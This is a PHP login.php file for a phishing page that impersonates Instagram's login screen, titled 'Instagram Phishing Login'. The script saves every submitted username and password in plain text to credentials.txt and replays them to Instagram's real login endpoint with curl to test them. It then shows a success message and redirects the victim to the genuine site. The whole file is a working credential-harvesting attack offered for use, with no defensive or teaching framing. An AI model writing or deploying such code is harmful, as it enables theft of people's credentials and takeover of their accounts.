<?php
// File: login.php

// Save credentials to a text file
$filename = 'credentials.txt';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Save to file
    file_put_contents($filename, "$username:$password\n", FILE_APPEND);

    // Use curl to send login request to Instagram's real API
    $ch = curl_init();

    // Set the headers for Instagram API
    curl_setopt($ch, CURLOPT_URL, 'https://www.instagram.com/accounts/login/ajax/');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'username' => $username,
        'password' => $password
    ]));

    // Set headers for the request
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
        'X-CSRFToken: your_csrf_token_here', // You can get this from Instagram login page
        'Referer: https://www.instagram.com/accounts/login/'
    ]);

    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    curl_close($ch);

    // Check if login was successful
    if ($http_code === 200) {
        echo "<h2>Login Successful!</h2>";
        echo "<p>Credentials saved to: <strong>credentials.txt</strong></p>";
        echo "<p>You have been redirected to real Instagram.</p>";
        echo "<script>window.location.href = 'https://www.instagram.com';</script>";
    } else {
        echo "<h2>Login Failed!</h2>";
        echo "<p>Invalid username or password.</p>";
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Instagram Phishing Login</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
    <h1>Instagram Login</h1>
    <form method="POST" action="">
        <label for="username">Username:</label>

        <input type="text" id="username" name="username" required>



        <label for="password">Password:</label>

        <input type="password" id="password" name="password" required>



        <input type="submit" value="Login">
    </form>
</body>
</html>